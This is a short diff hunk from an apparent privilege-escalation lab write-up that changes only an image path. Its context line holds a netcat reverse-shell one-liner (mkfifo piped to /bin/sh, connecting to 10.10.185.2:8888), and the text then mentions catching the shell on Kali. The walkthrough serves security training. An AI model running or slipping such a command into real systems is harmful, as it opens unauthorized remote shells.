@@ -159,7 +159,7 @@ echo 'mkfifo /tmp/cibykaz; nc 10.10.185.2 8888 0</tmp/cibykaz | /bin/sh >/tmp/ci
 
 Wait for the script to run and catch the shell on Kali.
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Exploiting PATH Variable
 
